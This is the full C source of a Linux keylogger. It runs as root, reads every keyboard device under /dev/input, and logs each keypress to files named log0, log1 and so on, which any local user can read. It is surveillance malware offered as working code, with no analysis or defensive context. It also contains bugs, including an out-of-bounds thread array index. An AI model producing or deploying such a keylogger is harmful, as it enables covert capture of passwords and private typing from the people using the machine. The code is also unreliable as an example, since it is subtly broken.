// !!!
// COMPILE WITH `gcc -pthread keylog.c`
// !!!

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>

#include <linux/input.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>

// NUM_KEYCODES is the size of the ASCII keycode array defined here
#define NUM_KEYCODES 195

// NUM_EVENTS is the size in bytes of a keyoard event, practically always 1 byte
#define NUM_EVENTS 1

/* KBD_BUF is byte length to hold the keyboard device file names in a char*
   Keyboard file name length ~60 bytes average
   KBD_BUF can hold 800/60 = 13 names, very unlikely to be more keyboard devices than that
   reduce buf_len for less memory consumption */
#define KBD_BUF 800

// Array index maps to Linux keycode ASCII
// Gaps in keycodes for unrecognised keys filled with UNKNOWN
const char *keycodes[] = {
  "UNKNOWN", // 0 not a keycode
  "ESC", // 1 == ESC
  "1",
  "2",
  "3",
  "4",
  "5",
  "6",
  "7",
  "8",
  "9",
  "0",
  "MINUS",
  "EQUAL",
  "BACKSPACE",
  "TAB",
  "Q",
  "W",
  "E",
  "R",
  "T",
  "Y",
  "U",
  "I",
  "O",
  "P",
  "LEFTBRACE",
  "RIGHTBRACE",
  "ENTER",
  "LEFTCTRL",
  "A",
  "S",
  "D",
  "F",
  "G",
  "H",
  "J",
  "K",
  "L",
  "SEMICOLON",
  "APOSTROPHE",
  "GRAVE",
  "LEFTSHIFT",
  "BACKSLASH",
  "Z",
  "X",
  "C",
  "V",
  "B",
  "N",
  "M",
  "COMMA",
  "DOT",
  "SLASH",
  "RIGHTSHIFT",
  "KPASTERISK",
  "LEFTALT",
  "SPACE",
  "CAPSLOCK",
  "F1",
  "F2",
  "F3",
  "F4",
  "F5",
  "F6",
  "F7",
  "F8",
  "F9",
  "F10",
  "NUMLOCK",
  "SCROLLLOCK",
  "(7)",
  "(8)",
  "(9)",
  "(-)",
  "(4)",
  "(5)",
  "(6)",
  "(+)",
  "(1)",
  "(2)",
  "(3)",
  "(0)",
  "(.)",
  "UNKNOWN",
  "ZENKAKUHANKAKU",
  "102ND",
  "F11",
  "F12",
  "RO",
  "KATAKANA",
  "HIRAGANA",
  "HENKAN",
  "KATAKANAHIRAGANA",
  "MUHENKAN",
  "KPJPCOMMA",
  "KPENTER",
  "RIGHTCTRL",
  "KPSLASH",
  "SYSRQ",
  "RIGHTALT",
  "UNKNOWN",
  "HOME",
  "UP",
  "PAGEUP",
  "LEFT",
  "RIGHT",
  "END",
  "DOWN",
  "PAGEDOWN",
  "INSERT",
  "DELETE",
  "UNKNOWN",
  "MUTE",
  "VOLUMEDOWN",
  "VOLUMEUP",
  "[POWER]",
  "KPEQUAL",
  "UNKNOWN",
  "PAUSE",
  "UNKNOWN",
  "KPCOMMA",
  "HANGUEL",
  "HANJA",
  "YEN",
  "LEFTMETA",
  "RIGHTMETA",
  "COMPOSE",
  "STOP",
  "AGAIN",
  "PROPS",
  "UNDO",
  "FRONT",
  "COPY",
  "OPEN",
  "PASTE",
  "FIND",
  "CUT",
  "HELP",
  "UNKNOWN",
  "CALC",
  "UNKNOWN",
  "SLEEP",
  "UNKNOWN", // 143-149 UNKNOWN
  "UNKNOWN",
  "UNKNOWN",
  "UNKNOWN",
  "UNKNOWN",
  "UNKNOWN",
  "UNKNOWN", // 149
  "WWW",
  "UNKNOWN",
  "SCREENLOCK",
  "UNKNOWN", // 153-157 UNKNOWN
  "UNKNOWN",
  "UNKNOWN",
  "UNKNOWN",
  "UNKNOWN", // 157
  "BACK",
  "FORWARD",
  "UNKNOWN",
  "EJECTCD",
  "UNKNOWN",
  "NEXTSONG",
  "PLAYPAUSE",
  "PREVIOUSSONG",
  "STOPCD",
  "UNKNOWN", // 167-172 UNKNOWN
  "UNKNOWN",
  "UNKNOWN",
  "UNKNOWN",
  "UNKNOWN",
  "UNKNOWN", // 172
  "REFRESH",
  "UNKNOWN",
  "UNKNOWN",
  "EDIT",
  "SCROLLUP",
  "SCROLLDOWN",
  "KPLEFTPAREN",
  "PLRIGHTPAREN",
  "UNKNOWN",
  "UNKNOWN",
  "F13",
  "F14",
  "F15",
  "F16",
  "F17",
  "F18",
  "F19",
  "F20",
  "F21",
  "F22",
  "F23",
  "F24" // 195 TOTAL
};

char* get_keyboard_files(char* keyboards, int buf_len) {
  FILE *fp;
  char path[1035];
  fp = popen("find /dev/input/by-path/*-kbd", "r");

  int i = 0;
  while(fgets(path, sizeof(path), fp) != NULL) {
    if (i == 0)
      strcpy(keyboards, path);
    else
      strcat(keyboards, path);
    i++;
  }
  pclose(fp);
  return keyboards;
}

// Handle signals to exit properly
int loop = 1;
void sigint_handler(int sig) {
  loop = 0;
}

int write_all(int file_desc, const char* str) {
  int bytes_wrote = 0;
  int bytes_to_write = strlen(str) + 1;

  do {
    bytes_wrote = write(file_desc, str, bytes_to_write);
    if(bytes_wrote == -1) {
      return 0;
    }
    bytes_to_write -= bytes_wrote;
    str += bytes_wrote;
  } while(bytes_to_write > 0);
}

void wrap_write_all(int file_desc, const char* str, int keyboard) {
  struct sigaction new_action, old_action;
  new_action.sa_handler = SIG_IGN;
  sigemptyset(&new_action.sa_mask);
  new_action.sa_flags = 0;
  sigaction(SIGPIPE, &new_action, &old_action);
  if(!write_all(file_desc, str)) {
    close(file_desc);
    close(keyboard);
    perror("\nwriting");
    exit(1);
  }
  sigaction(SIGPIPE, &old_action, NULL);
}

struct args {
  int keyboard;
  int write_out;
};

void* logger(void* input) {
  int keyboard = ((struct args*)input)->keyboard;
  int write_out = ((struct args*)input)->write_out;

  int event_size = sizeof(struct input_event);
  int bytes_read = 0;
  struct input_event events[NUM_EVENTS];
  int x;

  while(loop) {
    bytes_read = read(keyboard, events, event_size * NUM_EVENTS);

    for(x = 0; x < (bytes_read/event_size); ++x) {
      if(events[x].type == EV_KEY) {
        if(events[x].value == 1) {
          if(events[x].code > 0 && events[x].code < NUM_KEYCODES) {
            wrap_write_all(write_out, keycodes[events[x].code], keyboard);
            wrap_write_all(write_out, "\n", keyboard);
          } else {
            write(write_out, "UNKNOWN\n", sizeof("UNKNOWN\n"));
          }
        }
      }
    }
  }
  if(bytes_read > 0)
    wrap_write_all(write_out, "\n", keyboard);
}

int main() {
  int kbd_buf = KBD_BUF;
  char keyboards[kbd_buf];
  memset(keyboards, 0, kbd_buf);
  char* key = get_keyboard_files(keyboards, kbd_buf);

  // x will be the number of keyboard files available
  int x, j;
  for(j=0, x=0; key[j]; j++)
    x += (key[j] == '\n');

  pthread_t threads[x];
  char* spl = strtok(key, "\n");
  // 48 is 0 in ascii code, used to append 0, 1, 2 ... to output file name
  // e.g. log0, log1
  int i = 48;
  int count = 0;
  while (count < x) {
    int write_out;
    int keyboard;
    char* file_out_suf = "log";

    // Add suffix number for each output file for each keyboard device
    char suffix = (char) i;
    size_t len = strlen(file_out_suf);
    char* final_file = malloc(len + 1 + 1); // one byte for suffix, one for terminate 0
    strcpy(final_file, file_out_suf);
    final_file[len] = suffix;
    final_file[len+1] = '\0';

    // 0744 permissions - Everyone can read log file but only root can write
    // Change to 0700 to only allow root to view and write to logs
    if ((write_out = open(final_file, O_WRONLY|O_APPEND|O_CREAT, 0744)) < 0) {
      printf("Error opening output file");
      // exit(1); // Program will exit anyway on fail
    }

    if ((keyboard = open(spl, O_RDONLY)) < 0) {
      printf("Error opening keyboard file, make sure you're running as root");
      // exit(1);
    }
    struct args *key = (struct args *)malloc(sizeof(struct args));
    key->keyboard = keyboard;
    key->write_out = write_out;

    pthread_create(&threads[i], NULL, logger, (void *)key);
    i++;
    count++;

    // Move on to the next keyboard file
    spl = strtok(NULL, "\n");
  }

  // Join every thread in array to start logging
  int iter = 0;
  for (iter = 0; iter < x; iter++) {
    pthread_join(threads[iter], NULL);
  }
  return 0;
}
